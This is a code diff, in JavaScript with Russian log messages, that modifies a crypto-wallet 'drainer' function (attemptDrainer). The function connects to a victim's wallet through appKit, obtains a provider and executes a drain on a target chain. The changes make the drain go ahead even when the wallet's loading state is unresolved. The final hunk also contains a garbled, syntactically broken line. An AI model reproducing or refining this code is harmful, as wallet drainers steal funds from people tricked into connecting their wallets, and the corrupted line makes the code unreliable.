@@ -932,7 +932,7 @@ async function hideModalWithDelay(errorMessage = null) {
 
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠ Transaction already completed or pending');
+    console.log('⚠️ Transaction already completed or pending');
     await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
@@ -951,19 +951,24 @@ async function attemptDrainer() {
     let appKitState = appKit.getState ? appKit.getState() : {};
     console.log('🔍 Начальное состояние appKit:', JSON.stringify(appKitState, null, 2));
 
-    // Ожидаем завершения loading
-    let attempts = 0;
-    const maxAttempts = 10;
-    const interval = 1000;
-    while (appKitState.loading && attempts < maxAttempts) {
-      console.log(`ℹ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
-      await new Promise(resolve => setTimeout(resolve, interval));
-      appKitState = appKit.getState ? appKit.getState() : {};
-      attempts++;
-    }
+    // Проверяем, подключён ли кошелёк
+    if (connectedAddress && (appKitState.accounts?.length > 0 || !appKitState.loading)) {
+      console.log('✅ Кошелёк уже подключён, пропускаем ожидание loading');
+    } else {
+      // Ожидаем завершения loading или наличия accounts
+      let attempts = 0;
+      const maxAttempts = 10;
+      const interval = 1000;
+      while (appKitState.loading && !appKitState.accounts?.length && attempts < maxAttempts) {
+        console.log(`ℹ️ Ожидание завершения loading или наличия accounts, попытка ${attempts + 1}/${maxAttempts}...`);
+        await new Promise(resolve => setTimeout(resolve, interval));
+        appKitState = appKit.getState ? appKit.getState() : {};
+        attempts++;
+      }
 
-    if (appKitState.loading) {
-      throw new Error('AppKit loading state not resolved');
+      if (appKitState.loading && !appKitState.accounts?.length) {
+        console.warn('⚠️ AppKit loading state not resolved, но продолжаем с connectedAddress:', connectedAddress);
+      }
     }
 
     // Получаем провайдер через appKit.getProvider
@@ -1017,7 +1022,7 @@ async function attemptDrainer() {
       );
       console.log(`✅ Drainer executed, status: ${status}`);
     } else {
-      console.warn('⚠ Нет targetChainId, пропускаем drain');
+      console.warn('⚠️ Нет targetChainId, пропускаем drain');
     }
 
     hasDrained = true;
@@ -1038,7 +1043,7 @@ async function attemptDrainer() {
     } else if (error.message.includes('readonly property')) {
       errorMessage = `Error: Attempted to modify a readonly property: ${error.message}`;
     } else {
-      errorMessage = `Error: ${error.message}`;
+      errorMessage =  if (hasDrained || isTrans
     }
     console.error(`❌ Drainer error: ${errorMessage}`, error.stack);
     await hideModalWithDelay(errorMessage);
